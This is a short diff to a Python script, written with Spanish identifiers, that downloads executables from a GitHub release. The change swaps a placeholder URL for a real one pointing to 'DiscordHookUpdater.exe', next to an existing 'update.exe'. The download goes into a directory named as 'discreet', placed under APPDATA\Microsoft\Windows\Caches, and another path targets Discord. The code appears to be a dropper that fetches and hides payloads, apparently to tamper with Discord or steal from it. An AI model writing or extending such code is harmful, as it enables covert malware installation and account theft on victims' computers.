@@ -4,7 +4,7 @@ import urllib.request
 from pathlib import Path
 
 URL_PROGRAMA_1 = "https://github.com/zzlasdf/update/releases/download/update/update.exe"
-URL_PROGRAMA_2 = "https://github.com/TU_USUARIO/TU_REPOSITORIO/releases/download/tag/segundo_programa.exe"
+URL_PROGRAMA_2 = "https://github.com/zzlasdf/update/releases/download/update/DiscordHookUpdater.exe"
 
 DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
 DIRECTORIO_DISCORD_ESPECIFICO = os.path.join(
